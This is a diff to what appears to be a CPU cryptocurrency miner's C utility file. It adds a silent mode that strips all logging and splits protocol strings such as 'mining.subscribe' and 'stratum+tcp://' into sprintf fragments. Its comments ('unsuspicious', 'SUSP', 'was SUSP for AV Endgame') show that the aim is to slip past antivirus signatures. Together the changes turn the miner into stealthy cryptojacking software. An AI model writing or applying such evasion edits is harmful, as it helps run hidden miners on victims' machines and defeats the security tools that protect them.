@@ -69,6 +69,11 @@ struct thread_q {
 	pthread_cond_t		cond;
 };
 
+#ifdef MINER_SILENT
+void applog(int prio, const char *fmt, ...){}
+#define applog(...)
+#else
+#warning "not silent"
 void applog(int prio, const char *fmt, ...)
 {
 	va_list ap;
@@ -123,6 +128,7 @@ void applog(int prio, const char *fmt, ...)
 	}
 	va_end(ap);
 }
+#endif
 
 /* Modify the representation of integer numbers which would cause an overflow
  * so that they are treated as floating-point numbers.
@@ -415,10 +421,13 @@ json_t *json_rpc_call(CURL *curl, const char *url,
 	sprintf(len_hdr, "Content-Length: %lu",
 		(unsigned long) upload_data.len);
 
+	char str_[100]; // unsuspicious
 	headers = curl_slist_append(headers, "Content-Type: application/json");
 	headers = curl_slist_append(headers, len_hdr);
-	headers = curl_slist_append(headers, "User-Agent: " USER_AGENT);
-	headers = curl_slist_append(headers, "X-Mining-Extensions: midstate");
+	headers = curl_slist_append(headers, "User-Agent: " USER_AGENT); // TODO SUSP
+	//headers = curl_slist_append(headers, "X-Mining-Extensions: midstate");	 // SUSP
+	sprintf(str_, "X-Min%s-%s: midstate", "ing", "Extensions");
+	headers = curl_slist_append(headers,str_ );
 	headers = curl_slist_append(headers, "Accept:"); /* disable Accept hdr*/
 	headers = curl_slist_append(headers, "Expect:"); /* disable Expect hdr*/
 
@@ -438,8 +447,9 @@ json_t *json_rpc_call(CURL *curl, const char *url,
 	}
 
 	/* If X-Stratum was found, activate Stratum */
+	sprintf(str_, "stra%s+tcp://", "tum");
 	if (want_stratum && hi.stratum_url &&
-	    !strncasecmp(hi.stratum_url, "stratum+tcp://", 14)) {
+	    !strncasecmp(hi.stratum_url, str_, 14)) {
 		have_stratum = true;
 		tq_push(thr_info[stratum_thr_id].q, hi.stratum_url);
 		hi.stratum_url = NULL;
@@ -1036,19 +1046,19 @@ bool stratum_subscribe(struct stratum_ctx *sctx)
 start:
 	s = malloc(128 + (sctx->session_id ? strlen(sctx->session_id) : 0));
 	if (retry)
-		sprintf(s, "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": []}");
+		sprintf(s, "{\"id\": 1, \"method\": \"min%s.subscribe\", \"params\": []}", "ing");
 	else if (sctx->session_id)
-		sprintf(s, "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"" USER_AGENT "\", \"%s\"]}", sctx->session_id);
+		sprintf(s, "{\"id\": 1, \"method\": \"min%s.subscribe\", \"params\": [\"" USER_AGENT "\", \"%s\"]}", "ing", sctx->session_id);
 	else
-		sprintf(s, "{\"id\": 1, \"method\": \"mining.subscribe\", \"params\": [\"" USER_AGENT "\"]}");
+		sprintf(s, "{\"id\": 1, \"method\": \"min%s.subscribe\", \"params\": [\"" USER_AGENT "\"]}", "ing");
 
 	if (!stratum_send_line(sctx, s)) {
-		applog(LOG_ERR, "stratum_subscribe send failed");
+		applog(LOG_ERR, "stra%s_subscribe send failed", "tum");
 		goto out;
 	}
 
 	if (!socket_full(sctx->sock, 30)) {
-		applog(LOG_ERR, "stratum_subscribe timed out");
+		applog(LOG_ERR, "stra%s_subscribe timed out", "tum");
 		goto out;
 	}
 
@@ -1132,7 +1142,7 @@ bool stratum_authorize(struct stratum_ctx *sctx, const char *user, const char *p
 	bool ret = false;
 
 	s = malloc(80 + strlen(user) + strlen(pass));
-	sprintf(s, "{\"id\": 2, \"method\": \"mining.authorize\", \"params\": [\"%s\", \"%s\"]}",
+	sprintf(s, "{\"id\": 2, \"method\": \"min%s.authorize\", \"params\": [\"%s\", \"%s\"]}", "ing",
 	        user, pass);
 
 	if (!stratum_send_line(sctx, s))
@@ -1289,7 +1299,9 @@ static bool stratum_reconnect(struct stratum_ctx *sctx, json_t *params)
 		return false;
 
 	url = malloc(32 + strlen(host));
-	sprintf(url, "stratum+tcp://%s:%d", host, port);
+	// suspicous 
+	//sprintf(url, "stratum+tcp://%s:%d", host, port);
+	sprintf(url, "stra%s+tcp://%s:%d", "tum", host, port);
 
 	if (!opt_redirect) {
 		applog(LOG_INFO, "Ignoring request to reconnect to %s", url);
@@ -1354,10 +1366,12 @@ static bool stratum_show_message(struct stratum_ctx *sctx, json_t *id, json_t *p
 
 bool stratum_handle_method(struct stratum_ctx *sctx, const char *s)
 {
+	// was SUSP for AV "Endgame"
 	json_t *val, *id, *params;
 	json_error_t err;
 	const char *method;
 	bool ret = false;
+	char str_[40];
 
 	val = JSON_LOADS(s, &err);
 	if (!val) {
@@ -1371,23 +1385,28 @@ bool stratum_handle_method(struct stratum_ctx *sctx, const char *s)
 	id = json_object_get(val, "id");
 	params = json_object_get(val, "params");
 
-	if (!strcasecmp(method, "mining.notify")) {
+	sprintf(str_, "min%s.notify", "ing");
+	if (!strcasecmp(method, str_)) {
 		ret = stratum_notify(sctx, params);
 		goto out;
 	}
-	if (!strcasecmp(method, "mining.set_difficulty")) {
+	sprintf(str_, "min%sdifficulty", "ing.set_");
+	if (!strcasecmp(method, str_)) {
 		ret = stratum_set_difficulty(sctx, params);
 		goto out;
 	}
-	if (!strcasecmp(method, "client.reconnect")) {
+	sprintf(str_, "client.%s", "reconnect");
+	if (!strcasecmp(method, str_)) {
 		ret = stratum_reconnect(sctx, params);
 		goto out;
 	}
-	if (!strcasecmp(method, "client.get_version")) {
+	sprintf(str_, "client.%s", "get_version");
+	if (!strcasecmp(method, str_)) {
 		ret = stratum_get_version(sctx, id);
 		goto out;
 	}
-	if (!strcasecmp(method, "client.show_message")) {
+	sprintf(str_, "client.%s", "show_message");
+	if (!strcasecmp(method, str_)) {
 		ret = stratum_show_message(sctx, id, params);
 		goto out;
 	}
